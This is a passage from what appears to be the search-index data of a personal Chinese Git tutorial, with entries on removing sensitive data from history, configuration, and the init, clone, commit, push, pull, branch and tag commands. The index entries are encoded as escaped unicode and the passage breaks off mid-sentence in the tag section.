\u60a8\u8fd8\u53ef\u4ee5\u901a\u8fc7\u5c06\u8fc7\u6ee4\u540e\u7684\u5386\u53f2\u63a8\u5165\u4e00\u4e2a\u65b0\u7684\u6216\u7a7a\u7684\u5b58\u50a8\u5e93\uff0c\u7136\u540e\u4eceGitHub\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u514b\u9686\u6765\u5b9e\u73b0\u8fd9\u4e00\u70b9\u3002 \u4e0a\u9762\u547d\u4ee4\u7684\u7b2c\u4e00\u53e5\u4e5f\u53ef\u4ee5\u6362\u6210: $ rm -rf .git/refs/original/ git filter-branch \u6709\u5f88\u591a\u9677\u9631\uff0c\u8fd9\u4e9b\u9677\u9631\u53ef\u80fd\u4f1a\u5bf9\u9884\u671f\u7684\u5386\u53f2\u91cd\u5199\u4ea7\u751f\u4e0d\u660e\u663e\u7684\u7834\u574f\uff08\u5e76\u4e14\u7531\u4e8e\u5b83\u7684\u6027\u80fd\u5982\u6b64\u7cdf\u7cd5\uff0c\u56e0\u6b64\u60a8\u51e0\u4e4e\u6ca1\u6709\u65f6\u95f4\u8c03\u67e5\u6b64\u7c7b\u95ee\u9898\uff09\u3002\u8fd9\u4e9b\u5b89\u5168\u548c\u6027\u80fd\u95ee\u9898\u4e0d\u80fd\u5411\u540e\u517c\u5bb9\u4fee\u590d\uff0c\u56e0\u6b64\u4e0d\u5efa\u8bae\u4f7f\u7528\u5b83\u3002\u8bf7\u4f7f\u7528\u66ff\u4ee3\u5386\u53f2\u8fc7\u6ee4\u5de5\u5177\uff0c\u4f8b\u5982 git filter-repo \u3002 \u53c2\u8003 github\u7684\u5e2e\u52a9 remove sensitive data ,\u8bf4\u660e\u4e86\u4e00\u79cd\u4f7f\u7528BFG\u5de5\u5177\u7684\u601d\u8def\uff0c\u53ef\u80fd\u66f4\u4fbf\u5229\u3002","title":"Git"},{"location":"git/git/#git","text":"\u672c\u4eba\u603b\u7ed3\u7684 Git \u6559\u7a0b","title":"Git"},{"location":"git/git/#introduction","text":"Git \u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u5206\u5e03\u5f0f\u7248\u672c\u63a7\u5236\u7cfb\u7edf\uff0c\u7528\u4e8e\u654f\u6377\u9ad8\u6548\u5730\u5904\u7406\u4efb\u4f55\u6216\u5c0f\u6216\u5927\u7684\u9879\u76ee\u3002 Git \u662f Linus Torvalds \u4e3a\u4e86\u5e2e\u52a9\u7ba1\u7406 Linux \u5185\u6838\u5f00\u53d1\u800c\u5f00\u53d1\u7684\u4e00\u4e2a\u5f00\u653e\u6e90\u7801\u7684\u7248\u672c\u63a7\u5236\u8f6f\u4ef6\u3002 Git \u4e0e\u5e38\u7528\u7684\u7248\u672c\u63a7\u5236\u5de5\u5177 CVS, Subversion \u7b49\u4e0d\u540c\uff0c\u5b83\u91c7\u7528\u4e86\u5206\u5e03\u5f0f\u7248\u672c\u5e93\u7684\u65b9\u5f0f\uff0c\u4e0d\u5fc5\u670d\u52a1\u5668\u7aef\u8f6f\u4ef6\u652f\u6301\u3002 Git Official: https://git-scm.com/ Git Documentation: https://git-scm.com/doc Git Reference Guide: https://git-scm.com/docs Git Book: https://git-scm.com/book/en/v2","title":"\u7b80\u4ecb"},{"location":"git/git/#install","text":"\u5404\u7cfb\u7edf\u5b89\u88c5\u5b98\u65b9\u8bf4\u660e: https://git-scm.com/downloads Older releases are available and the Git source repository is on GitHub. git [--version] [--help] [-C <path>] [-c <name>=<value>] [--exec-path[=<path>]] [--html-path] [--man-path] [--info-path] [-p|--paginate|-P|--no-pager] [--no-replace-objects] [--bare] [--git-dir=<path>] [--work-tree=<path>] [--namespace=<name>] [--super-prefix=<path>] [--config-env=<name>=<envvar>] <command> [<args>] Git \u5177\u6709\u5f02\u5e38\u4e30\u5bcc\u7684\u547d\u4ee4\u96c6\uff0c\u53ef\u63d0\u4f9b\u9ad8\u7ea7\u64cd\u4f5c\u548c\u5bf9\u5185\u90e8\u7684\u5b8c\u5168\u8bbf\u95ee\u3002 \u638c\u63e1\u57fa\u672c\u547d\u4ee4\u540e\uff0c\u53ef\u4ee5\u901a\u8fc7\u201cgit help command\u201d\u4e86\u89e3\u66f4\u591a\u5173\u4e8e\u5355\u4e2a Git \u547d\u4ee4\u7684\u4fe1\u606f\u3002","title":"\u5b89\u88c5"},{"location":"git/git/#configuration","text":"Git \u63d0\u4f9b\u4e86\u4e00\u4e2a\u53eb\u505a git config \u7684\u5de5\u5177\uff0c\u4e13\u95e8\u7528\u6765\u914d\u7f6e\u6216\u8bfb\u53d6\u76f8\u5e94\u7684\u5de5\u4f5c\u73af\u5883\u53d8\u91cf\u3002 \u8fd9\u4e9b\u73af\u5883\u53d8\u91cf\uff0c\u51b3\u5b9a\u4e86 Git \u5728\u5404\u4e2a\u73af\u8282\u7684\u5177\u4f53\u5de5\u4f5c\u65b9\u5f0f\u548c\u884c\u4e3a\u3002\u8fd9\u4e9b\u53d8\u91cf\u53ef\u4ee5\u5b58\u653e\u5728\u4ee5\u4e0b\u4e09\u4e2a\u4e0d\u540c\u7684\u5730\u65b9\uff1a /etc/gitconfig \u6587\u4ef6\uff1a\u7cfb\u7edf\u4e2d\u5bf9\u6240\u6709\u7528\u6237\u90fd\u666e\u904d\u9002\u7528\u7684\u914d\u7f6e\u3002\u82e5\u4f7f\u7528 git config \u65f6\u7528 --system \u9009\u9879\uff0c\u8bfb\u5199\u7684\u5c31\u662f\u8fd9\u4e2a\u6587\u4ef6\u3002 ~/.gitconfig \u6587\u4ef6\uff1a\u7528\u6237\u76ee\u5f55\u4e0b\u7684\u914d\u7f6e\u6587\u4ef6\u53ea\u9002\u7528\u4e8e\u8be5\u7528\u6237\u3002\u82e5\u4f7f\u7528 git config \u65f6\u7528 --global \u9009\u9879\uff0c\u8bfb\u5199\u7684\u5c31\u662f\u8fd9\u4e2a\u6587\u4ef6\u3002 \u5f53\u524d\u9879\u76ee\u7684 Git \u76ee\u5f55\u4e2d\u7684\u914d\u7f6e\u6587\u4ef6\uff08\u4e5f\u5c31\u662f\u5de5\u4f5c\u76ee\u5f55\u4e2d\u7684 .git/config \u6587\u4ef6\uff09\uff1a\u8fd9\u91cc\u7684\u914d\u7f6e\u4ec5\u4ec5\u9488\u5bf9\u5f53\u524d\u9879\u76ee\u6709\u6548\u3002\u6bcf\u4e00\u4e2a\u7ea7\u522b\u7684\u914d\u7f6e\u90fd\u4f1a\u8986\u76d6\u4e0a\u5c42\u7684\u76f8\u540c\u914d\u7f6e\uff0c\u6240\u4ee5 .git/config \u91cc\u7684\u914d\u7f6e\u4f1a\u8986\u76d6 /etc/gitconfig \u4e2d\u7684\u540c\u540d\u53d8\u91cf\u3002 \u5728 Windows \u7cfb\u7edf\u4e0a\uff0cGit \u4f1a\u627e\u5bfb\u7528\u6237\u4e3b\u76ee\u5f55\u4e0b\u7684 .gitconfig \u6587\u4ef6\u3002\u4e3b\u76ee\u5f55\u5373 $HOME \u53d8\u91cf\u6307\u5b9a\u7684\u76ee\u5f55\uff0c\u4e00\u822c\u90fd\u662f C:\\Documents and Settings\\$USER \u3002 \u5e38\u7528\u7684\u914d\u7f6e\u547d\u4ee4\u5982\u4e0b: # \u914d\u7f6e\u4e2a\u4eba\u7684\u7528\u6237\u540d\u79f0\u548c\u7535\u5b50\u90ae\u4ef6\u5730\u5740\uff1a $ git config --global user.name \"runoob\" $ git config --global user.email test@runoob.com # \u8bbe\u7f6eGit\u9ed8\u8ba4\u4f7f\u7528\u7684\u6587\u672c\u7f16\u8f91\u5668, \u4e00\u822c\u53ef\u80fd\u4f1a\u662f `Vi` \u6216\u8005 `Vim`\u3002\u5982\u679c\u4f60\u6709\u5176\u4ed6\u504f\u597d\uff0c\u6bd4\u5982 `Emacs` \u7684\u8bdd\uff0c\u53ef\u4ee5\u91cd\u65b0\u8bbe\u7f6e: $ git config --global core.editor emacs # \u8fd8\u6709\u4e00\u4e2a\u6bd4\u8f83\u5e38\u7528\u7684\u662f\uff0c\u5728\u89e3\u51b3\u5408\u5e76\u51b2\u7a81\u65f6\u4f7f\u7528\u54ea\u79cd\u5dee\u5f02\u5206\u6790\u5de5\u5177\u3002\u6bd4\u5982\u8981\u6539\u7528 `vimdiff` \u7684\u8bdd\uff1a # Git \u53ef\u4ee5\u7406\u89e3 kdiff3\uff0ctkdiff\uff0cmeld\uff0cxxdiff\uff0cemerge\uff0cvimdiff\uff0cgvimdiff\uff0cecmerge\uff0c\u548c opendiff \u7b49\u5408\u5e76\u5de5\u5177\u7684\u8f93\u51fa\u4fe1\u606f\u3002 $ git config --global merge.tool vimdiff # \u8981\u68c0\u67e5\u5df2\u6709\u7684\u914d\u7f6e\u4fe1\u606f\uff0c\u53ef\u4ee5\u4f7f\u7528\u547d\u4ee4\uff1a $ git config --list http.postbuffer=2M user.name=runoob user.email=test@runoob.com # \u53ef\u4ee5\u76f4\u63a5\u67e5\u8be2\u67d0\u4e2a\u53d8\u91cf\u7684\u8bbe\u5b9a\uff0c\u50cf\u8fd9\u6837: $ git config user.name runoob \u5982\u679c\u8981\u5728\u67d0\u4e2a\u7279\u5b9a\u7684\u9879\u76ee\u4e2d\u4f7f\u7528\u5176\u4ed6\u540d\u5b57\u6216\u8005\u7535\u90ae\uff0c\u53ea\u8981\u53bb\u6389 --global \u9009\u9879\u91cd\u65b0\u914d\u7f6e\u5373\u53ef\uff0c\u65b0\u7684\u8bbe\u5b9a\u4fdd\u5b58\u5728\u5f53\u524d\u9879\u76ee\u7684 .git/config \u6587\u4ef6\u91cc\u3002 \u6709\u65f6\u5019\u4f1a\u770b\u5230\u91cd\u590d\u7684\u53d8\u91cf\u540d\uff0c\u90a3\u5c31\u8bf4\u660e\u5b83\u4eec\u6765\u81ea\u4e0d\u540c\u7684\u914d\u7f6e\u6587\u4ef6\uff08\u6bd4\u5982 /etc/gitconfig \u548c ~/.gitconfig \uff09\uff0c\u4e0d\u8fc7\u6700\u7ec8 Git \u5b9e\u9645\u91c7\u7528\u7684\u662f\u6700\u540e\u4e00\u4e2a\u3002 \u8fd9\u4e9b\u914d\u7f6e\u6211\u4eec\u4e5f\u53ef\u4ee5\u5728 ~/.gitconfig \u6216 /etc/gitconfig \u4e5f\u80fd\u770b\u5230\u3002","title":"\u914d\u7f6e"},{"location":"git/git/#workflows","text":"","title":"\u6d41\u7a0b"},{"location":"git/git/#init","text":"git-init - \u521b\u5efa\u4e00\u4e2a\u7a7a\u7684 Git \u5b58\u50a8\u5e93\u6216\u91cd\u65b0\u521d\u59cb\u5316\u73b0\u6709\u7684 git init [-q | --quiet] [--bare] [--template=<template_directory>] [--separate-git-dir <git dir>] [--object-format=<format>] [-b <branch-name> | --initial-branch=<branch-name>] [--shared[=<permissions>]] [directory] \u8be5\u547d\u4ee4\u521b\u5efa\u4e00\u4e2a\u7a7a\u7684Git\u5b58\u50a8\u5e93 - \u672c\u8d28\u4e0a\u662f\u4e00\u4e2a .git \u76ee\u5f55\uff0c\u5176\u4e2d\u5305\u542b objects \u3001 refs/heads \u3001 refs/tags \u548c\u6a21\u677f\u6587\u4ef6\u7684\u5b50\u76ee\u5f55\u3002\u8fd8\u5c06\u521b\u5efa\u4e00\u4e2a\u5f15\u7528master\u5206\u652f HEAD \u7684\u521d\u59cb HEAD \u6587\u4ef6\u3002 --bare : \u521b\u5efa\u4e00\u4e2a\u7eaf\u4ed3\u5e93\u3002\u5982\u679c\u672a\u8bbe\u7f6e GIT_DIR \u73af\u5883\u53d8\u91cf\uff0c\u5219\u5c06\u5176\u8bbe\u7f6e\u4e3a\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55\u3002 --object-format=<format> : \u6307\u5b9a\u5b58\u50a8\u5e93\u7684\u5bf9\u8c61\u683c\u5f0f\uff08\u54c8\u5e0c\u7b97\u6cd5\uff09\u3002\u6709\u6548\u503c\u4e3a sha1 \u548c\uff08\u5982\u679c\u542f\u7528\uff09 sha256 \u3002 sha1 \u662f\u9ed8\u8ba4\u503c\u3002 --template=<template_directory> : \u6307\u5b9a\u8981\u4f7f\u7528\u6a21\u677f\u7684\u76ee\u5f55\u3002 -b <branch-name> | --initial-branch=<branch-name> : \u5728\u65b0\u521b\u5efa\u7684\u4ed3\u5e93\u4e2d\u4e3a\u521d\u59cb\u5206\u652f\u6307\u5b9a\u540d\u79f0\u3002\u5982\u679c\u6ca1\u6709\u6307\u5b9a\uff0c\u5219\u4f7f\u7528\u9ed8\u8ba4\u540d\u79f0\uff1a master \u3002 --shared : \u6307\u5b9a Git \u5b58\u50a8\u5e93\u5728\u591a\u4e2a\u7528\u6237\u4e4b\u95f4\u5171\u4eab\u3002 \u53c2\u8003: https://git-scm.com/docs/git-init","title":"\u521d\u59cb\u5316"},{"location":"git/git/#clone","text":"\u5c06\u5b58\u50a8\u5e93\u514b\u9686\u5230\u65b0\u521b\u5efa\u7684\u76ee\u5f55\u4e2d\uff0c\u4e3a\u514b\u9686\u5b58\u50a8\u5e93\u4e2d\u7684\u6bcf\u4e2a\u5206\u652f\u521b\u5efa\u8fdc\u7a0b\u8ddf\u8e2a\u5206\u652f: git clone [--template=<template-directory>] [-l] [-s] [--no-hardlinks] [-q] [-n] [--bare] [--mirror] [-o <name>] [-b <name>] [-u <upload-pack>] [--reference <repository>] [--dissociate] [--separate-git-dir <git-dir>] [--depth <depth>] [--[no-]single-branch] [--no-tags] [--recurse-submodules[=<pathspec>]] [--[no-]shallow-submodules] [--[no-]remote-submodules] [--jobs <n>] [--sparse] [--[no-]reject-shallow] [--filter=<filter> [--also-filter-submodules]] [--] <repository> [<directory>] git clone -q , --quiet \u3010\u8fdc\u7a0b\u4ed3\u5e93\u5730\u5740\u3011: \u5b89\u9759\u5730\u64cd\u4f5c\u3002\u8fdb\u5c55\u4e0d\u4f1a\u62a5\u544a\u7ed9\u6807\u51c6\u9519\u8bef\u6d41\u3002 git clone -n, --no-checkout\u3010\u8fdc\u7a0b\u4ed3\u5e93\u5730\u5740\u3011: \u514b\u9686\u5b8c\u6210\u540e\u4e0d\u4f1a\u6267\u884c HEAD \u7684\u68c0\u51fa\u3002 git clone --bare \u3010\u8fdc\u7a0b\u4ed3\u5e93\u5730\u5740\u3011: \u5236\u4f5c\u4e00\u4e2a\u88f8\u9732\u7684Git\u5b58\u50a8\u5e93\u3002 \u4e5f\u5c31\u662f\u8bf4\uff0c\u4e0d\u8981\u521b\u5efa <directory> \u5e76\u5c06\u7ba1\u7406\u6587\u4ef6\u653e\u7f6e\u5728 <directory>/.git \u4e2d\uff0c\u800c\u662f\u5c06 <directory> \u672c\u8eab\u8bbe\u7f6e\u4e3a $GIT_DIR \u3002 \u663e\u7136\u8fd9\u610f\u5473\u7740 --no-checkout \uff0c\u56e0\u4e3a\u6ca1\u6709\u5730\u65b9\u53ef\u4ee5\u68c0\u51fa\u5de5\u4f5c\u6811\u3002 \u540c\u6837\uff0c\u5c06\u8fdc\u7a0b\u7684\u5206\u652f\u5934\u76f4\u63a5\u590d\u5236\u5230\u76f8\u5e94\u7684\u672c\u5730\u5206\u652f\u5934\uff0c\u800c\u65e0\u9700\u5c06\u5176\u6620\u5c04\u5230 ref/remotes/origin/ \u3002 \u4f7f\u7528\u6b64\u9009\u9879\u65f6\uff0c\u4e0d\u4f1a\u521b\u5efa\u8fdc\u7a0b\u8ddf\u8e2a\u5206\u652f\u6216\u76f8\u5173\u7684\u914d\u7f6e\u53d8\u91cf\u3002 git clone --mirror \u3010\u8fdc\u7a0b\u4ed3\u5e93\u5730\u5740\u3011: \u8bbe\u7f6e\u6e90\u5b58\u50a8\u5e93\u7684\u955c\u50cf\u3002 \u8fd9\u610f\u5473\u7740\u88f8\u9732( --bare )\u3002 \u4e0e --bare \u76f8\u6bd4\uff0c --mirror \u4e0d\u4ec5\u5c06\u6e90\u7684\u672c\u5730\u5206\u652f\u6620\u5c04\u5230\u76ee\u6807\u7684\u672c\u5730\u5206\u652f\uff0c\u8fd8\u6620\u5c04\u6240\u6709\u5f15\u7528\uff08\u5305\u62ec\u8fdc\u7a0b\u8ddf\u8e2a\u5206\u652f\uff0c\u6ce8\u91ca\u7b49\uff09\uff0c\u5e76\u8bbe\u7f6e\u4e00\u4e2arefspec\u914d\u7f6e\uff0c\u4ee5\u4fbf\u6240\u6709\u8fd9\u4e9b\u5f15\u7528 \u88ab\u76ee\u6807\u5b58\u50a8\u5e93\u4e2d\u7684git\u8fdc\u7a0b\u66f4\u65b0\u8986\u76d6\u3002 git clone -b, --branch \u3010\u8fdc\u7a0b\u4ed3\u5e93\u5730\u5740\u3011: \u4e0d\u8981\u5c06\u65b0\u521b\u5efa\u7684HEAD\u6307\u5411\u514b\u9686\u7684\u5b58\u50a8\u5e93\u7684HEAD\u6240\u6307\u5411\u7684\u5206\u652f\uff0c\u800c\u662f\u6307\u5411 \u5206\u652f\u3002 git clone --depth \u3010\u8fdc\u7a0b\u4ed3\u5e93\u5730\u5740\u3011: \u521b\u5efa\u4e00\u4e2a\u6d45\u514b\u9686\uff0c\u5176\u5386\u53f2\u8bb0\u5f55\u88ab\u622a\u65ad\u4e3a\u6307\u5b9a\u7684\u63d0\u4ea4\u6570\u3002 \u8868\u793a --single-branch \uff0c\u9664\u975e\u7ed9\u51fa --no-single-branch \u6765\u83b7\u53d6\u6240\u6709\u5206\u652f\u7684\u5c16\u7aef\u9644\u8fd1\u7684\u5386\u53f2\u8bb0\u5f55\u3002 \u5982\u679c\u8981\u6d45\u5c42\u514b\u9686\u5b50\u6a21\u5757\uff0c\u5219\u8fd8\u8981\u4f20\u9012 --shallow-submodules \u3002 \u53c2\u8003: https://git-scm.com/docs/git-clone","title":"\u514b\u9686"},{"location":"git/git/#commit","text":"git-commit - \u8bb0\u5f55\u5bf9\u5b58\u50a8\u5e93\u7684\u66f4\u6539 git commit [-a | --interactive | --patch] [-s] [-v] [-u<mode>] [--amend] [--dry-run] [(-c | -C | --squash) <commit> | --fixup [(amend|reword):]<commit>)] [-F <file> | -m <msg>] [--reset-author] [--allow-empty] [--allow-empty-message] [--no-verify] [-e] [--author=<author>] [--date=<date>] [--cleanup=<mode>] [--[no-]status] [-i | -o] [--pathspec-from-file=<file> [--pathspec-file-nul]] [(--trailer <token>[(=|:)<value>])\u2026\u200b] [-S[<keyid>]] [--] [<pathspec>\u2026\u200b] -F : \u4ece\u7ed9\u5b9a\u6587\u4ef6\u4e2d\u83b7\u53d6\u63d0\u4ea4\u6d88\u606f\u3002\u4f7f\u7528-\u4ece\u6807\u51c6\u8f93\u5165\u8bfb\u53d6\u6d88\u606f\u3002 -m : \u4f7f\u7528\u7ed9\u5b9a\u7684 \u4f5c\u4e3a\u63d0\u4ea4\u6d88\u606f\u3002\u5982\u679c\u7ed9\u51fa\u4e86\u591a\u4e2a -m \u9009\u9879\uff0c\u5b83\u4eec\u7684\u503c\u5c06\u8fde\u63a5\u4e3a\u5355\u72ec\u7684\u6bb5\u843d\u3002 -m \u9009\u9879\u4e0e -c \u3001 -C \u548c -F \u4e92\u65a5\u3002 \u53c2\u8003: https://git-scm.com/docs/git-commit","title":"\u63d0\u4ea4"},{"location":"git/git/#push","text":"git-push - \u66f4\u65b0\u8fdc\u7a0b\u5f15\u7528\u4ee5\u53ca\u5173\u8054\u5bf9\u8c61 git push [--all | --mirror | --tags] [--follow-tags] [--atomic] [-n | --dry-run] [--receive-pack=<git-receive-pack>] [--repo=<repository>] [-f | --force] [-d | --delete] [--prune] [-v | --verbose] [-u | --set-upstream] [-o <string> | --push-option=<string>] [--[no-]signed|--signed=(true|false|if-asked)] [--force-with-lease[=<refname>[:<expect>]] [--force-if-includes]] [--no-verify] [<repository> [<refspec>\u2026\u200b]] --tags : \u9664\u4e86\u5728\u547d\u4ee4\u884c\u4e0a\u660e\u786e\u5217\u51fa\u7684 refspecs \u4e4b\u5916\uff0c refs/tags \u6240\u6709\u7684 refs \u90fd\u4f1a\u88ab\u63a8\u9001\u3002 --atomic : \u5982\u679c\u53ef\u7528\uff0c\u8bf7\u5728\u8fdc\u7a0b\u7aef\u4f7f\u7528\u539f\u5b50\u4e8b\u52a1\u3002\u8981\u4e48\u66f4\u65b0\u6240\u6709 refs\uff0c\u8981\u4e48\u5728\u9519\u8bef\u65f6\u4e0d\u66f4\u65b0 refs\u3002\u5982\u679c\u670d\u52a1\u5668\u4e0d\u652f\u6301\u539f\u5b50\u63a8\u9001\uff0c\u63a8\u9001\u5c06\u5931\u8d25\u3002 -u | --set-upstream : \u5bf9\u4e8e\u6bcf\u4e2a\u6700\u65b0\u6216\u6210\u529f\u63a8\u9001\u7684\u5206\u652f\uff0c\u4f7f\u7528\u65e0\u53c2\u6570 git-pull \u548c\u5176\u4ed6\u547d\u4ee4\uff0c\u6dfb\u52a0\u4e0a\u6e38\uff08\u8ddf\u8e2a\uff09\u5f15\u7528\u3002 \u53c2\u8003: https://git-scm.com/docs/git-push","title":"\u63a8\u9001"},{"location":"git/git/#pull","text":"git-pull - \u5c06\u6765\u81ea\u8fdc\u7a0b\u5b58\u50a8\u5e93\u7684\u66f4\u6539\u5408\u5e76\u5230\u5f53\u524d\u5206\u652f\u4e2d git pull [<options>] [<repository> [<refspec>\u2026\u200b]] \u53c2\u8003: https://git-scm.com/docs/git-pull","title":"\u66f4\u65b0"},{"location":"git/git/#branch","text":"git-branch - \u5217\u51fa\u3001\u521b\u5efa\u6216\u5220\u9664\u5206\u652f git branch [--color[=<when>] | --no-color] [--show-current] [-v [--abbrev=<n> | --no-abbrev]] [--column[=<options>] | --no-column] [--sort=<key>] [--merged [<commit>]] [--no-merged [<commit>]] [--contains [<commit>]] [--no-contains [<commit>]] [--points-at <object>] [--format=<format>] [(-r | --remotes) | (-a | --all)] [--list] [<pattern>\u2026\u200b] git branch [--track[=(direct|inherit)] | --no-track] [-f] [--recurse-submodules] <branchname> [<start-point>] git branch (--set-upstream-to=<upstream> | -u <upstream>) [<branchname>] git branch --unset-upstream [<branchname>] git branch (-m | -M) [<oldbranch>] <newbranch> git branch (-c | -C) [<oldbranch>] <newbranch> git branch (-d | -D) [-r] <branchname>\u2026\u200b git branch --edit-description [<branchname>] \u5982\u679c\u7ed9\u51fa --list \uff0c\u6216\u8005\u6ca1\u6709\u975e\u9009\u9879\u53c2\u6570\uff0c\u5219\u5217\u51fa\u73b0\u6709\u5206\u652f\uff1b\u5f53\u524d\u5206\u652f\u5c06\u4ee5\u7eff\u8272\u7a81\u51fa\u663e\u793a\u5e76\u6807\u6709\u661f\u53f7\u3002\u5728\u94fe\u63a5\u7684\u5de5\u4f5c\u6811\u4e2d\u7b7e\u51fa\u7684\u4efb\u4f55\u5206\u652f\u90fd\u5c06\u4ee5\u9752\u8272\u7a81\u51fa\u663e\u793a\u5e76\u6807\u6709\u52a0\u53f7\u3002\u9009\u9879 -r \u5bfc\u81f4\u5217\u51fa\u8fdc\u7a0b\u8ddf\u8e2a\u5206\u652f\uff0c\u9009\u9879 -a \u663e\u793a\u672c\u5730\u548c\u8fdc\u7a0b\u5206\u652f\u3002 \u5982\u679c <pattern> \u7ed9\u5b9a\u4e86 a\uff0c\u5219\u5c06\u5176\u7528\u4f5c shell \u901a\u914d\u7b26\u4ee5\u5c06\u8f93\u51fa\u9650\u5236\u4e3a\u5339\u914d\u7684\u5206\u652f\u3002\u5982\u679c\u7ed9\u51fa\u4e86\u591a\u4e2a\u6a21\u5f0f\uff0c\u5219\u5982\u679c\u5b83\u4e0e\u4efb\u4f55\u6a21\u5f0f\u5339\u914d\uff0c\u5219\u4f1a\u663e\u793a\u4e00\u4e2a\u5206\u652f\u3002 \u8bf7\u6ce8\u610f\uff0c\u63d0\u4f9b <pattern> \u65f6\uff0c\u60a8\u5fc5\u987b\u4f7f\u7528 --list ; \u5426\u5219\u8be5\u547d\u4ee4\u53ef\u80fd\u88ab\u89e3\u91ca\u4e3a\u5206\u652f\u521b\u5efa\u3002 \u8be5\u547d\u4ee4\u7684\u7b2c\u4e8c\u79cd\u5f62\u5f0f\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a <branchname> \u7684\u65b0\u5206\u652f\u5934\uff0c\u5b83\u6307\u5411\u5f53\u524d\u7684 HEAD \uff0c\u6216\u8005\u7ed9\u5b9a\u7684 <start-point> \u3002\u4f5c\u4e3a\u4e00\u79cd\u7279\u6b8a\u60c5\u51b5\uff0c\u5bf9\u4e8e <start-point> \uff0c\u60a8\u53ef\u4ee5\u5c06 \"A...B\" \u5176\u7528\u4f5c\u5408\u5e76\u57fa\u7840\u7684\u5feb\u6377\u65b9\u5f0f\uff0c A \u5e76\u4e14 B \u5982\u679c\u53ea\u6709\u4e00\u4e2a\u5408\u5e76\u57fa\u7840\u3002\u60a8\u6700\u591a\u53ef\u4ee5\u7701\u7565\u4e00\u4e2a A and B \uff0c\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u5b83\u9ed8\u8ba4\u4e3a HEAD . \u8bf7\u6ce8\u610f\uff0c\u8fd9\u5c06\u521b\u5efa\u65b0\u5206\u652f\uff0c\u4f46\u4e0d\u4f1a\u5c06\u5de5\u4f5c\u6811\u5207\u6362\u5230\u5b83\uff1b\u4f7f\u7528\u201cgit switch \u201d\u5207\u6362\u5230\u65b0\u5206\u652f\u3002 \u4f7f\u7528 -m \u6216\u8005 -M \u9009\u9879\uff0c \u5c06\u88ab\u91cd\u547d\u540d\u4e3a \u3002\u5982\u679c \u6709\u76f8\u5e94\u7684 reflog\uff0c\u5219\u5c06\u5176\u91cd\u547d\u540d\u4ee5\u5339\u914d \uff0c\u5e76\u521b\u5efa\u4e00\u4e2a reflog \u6761\u76ee\u4ee5\u8bb0\u4f4f\u5206\u652f\u91cd\u547d\u540d\u3002\u5982\u679c \u5b58\u5728\uff0c\u5219\u5fc5\u987b\u4f7f\u7528 -M \u6765\u5f3a\u5236\u8fdb\u884c\u91cd\u547d\u540d\u3002 -c \u548c -C \u9009\u9879\u4e0e -m \u548c -M \u5177\u6709\u5b8c\u5168\u76f8\u540c\u7684\u8bed\u4e49\uff0c\u9664\u4e86\u5206\u652f\u4e0d\u4f1a\u88ab\u91cd\u547d\u540d\uff0c\u5b83\u5c06\u88ab\u590d\u5236\u5230\u4e00\u4e2a\u65b0\u540d\u79f0\uff0c\u4ee5\u53ca\u5b83\u7684\u914d\u7f6e\u548c reflog\u3002 \u5e26\u6709 -d \u6216 -D \u9009\u9879\uff0c \u5c06\u88ab\u5220\u9664\u3002\u60a8\u53ef\u4ee5\u6307\u5b9a\u591a\u4e2a\u8981\u5220\u9664\u7684\u5206\u652f\u3002\u5982\u679c\u5206\u652f\u5f53\u524d\u6709 reflog\uff0c\u5219 reflog \u4e5f\u5c06\u88ab\u5220\u9664\u3002 -r \u4e0e -d \u4e00\u8d77\u4f7f\u7528\u5220\u9664\u8fdc\u7a0b\u8ddf\u8e2a\u5206\u652f\u3002\u8bf7\u6ce8\u610f\uff0c\u53ea\u6709\u5728\u8fdc\u7a0b\u5b58\u50a8\u5e93\u4e2d\u4e0d\u518d\u5b58\u5728\u8fdc\u7a0b\u8ddf\u8e2a\u5206\u652f\u6216 git fetch \u914d\u7f6e\u4e3a\u4e0d\u518d\u83b7\u53d6\u5b83\u4eec\u65f6\uff0c\u5220\u9664\u8fdc\u7a0b\u8ddf\u8e2a\u5206\u652f\u624d\u6709\u610f\u4e49\u3002 \u53c2\u8003: https://git-scm.com/docs/git-branch","title":"\u5206\u652f"},{"location":"git/git/#tag","text":"git-tag - \u521b\u5efa\u3001\u5217\u51fa\u3001\u5220\u9664\u6216\u4f7f\u7528 GPG \u7b7e\u540d\u7684\u9a8c\u8bc1\u6807\u7b7e\u5bf9\u8c61 git tag [-a | -s | -u <keyid>] [-f] [-m <msg> | -F <file>] [-e] <tagname> [<commit> | <object>] git tag -d <tagname>\u2026\u200b git tag [-n[<num>]] -l [--contains <commit>] [--no-contains <commit>] [--points-at <object>] [--column[=<options>] | --no-column] [--create-reflog] [--sort=<key>] [--format=<format>] [--merged <commit>] [--no-merged <commit>] [<pattern>\u2026\u200b] git tag -v [--format=<format>] <tagname>\u2026\u200b \u5728 refs/tags/ \u4e2d\u6dfb\u52a0\u6807\u7b7e\u5f15\u7528\uff0c\u9664\u975e -d/-l/-v \u7ed9\u51fa\u5220\u9664\u3001\u5217\u51fa\u6216\u9a8c\u8bc1\u6807\u7b7e\u3002 \u9664\u975e\u7ed9\u51fa -f \uff0c\u5426\u5219\u547d\u540d\u6807\u7b7e\u5fc5\u987b\u4e0d\u5b58\u5728\u3002 \u5982\u679c\u4f20\u9012\u4e86 -a \u3001 -s \u6216 -u <keyid> \u4e2d\u7684\u4e00\u4e2a\uff0c\u5219\u8be5\u547d\u4ee4\u5c06\u521b\u5efa\u4e00\u4e2a\u6807\u8bb0\u5bf9\u8c61\uff0c\u5e76\u9700\u8981\u4e00\u4e2a\u6807\u8bb0\u6d88\u606f\u3002\u9664\u975e\u7ed9\u51fa -m <msg> \u6216 -F <file> \uff0c\u5426\u5219\u5c06\u542f\u52a8\u4e00\u4e2a\u7f16\u8f91\u5668\u4f9b\u7528\u6237\u952e\u5165\u6807\u7b7e\u6d88\u606f\u3002 \u5982\u679c -m <msg> \u6216 -F <file> \u88ab\u7ed9\u51fa\u5e76\u4e14 -a , -s , \u548c -u <keyid> \u4e0d\u5b58\u5728,\u90a3\u4e48 -a \u662f\u9690\u542b\u7684\u3002 \u5426\u5219\uff0c\u5c06\u521b\u5efa\u76f4\u63a5\u6307\u5411\u7ed9\u5b9a\u5bf9\u8c61\u7684\u6807\u8bb0\u5f15\u7528\uff08\u5373\u8f7b\u91cf\u7ea7\u6807\u8bb0\uff09\u3002 \u4e00\u4e2a GnuPG \u7b7e\u540d\u7684\u6807\u7b7e\u5bf9\u8c61\u5c06\u5728 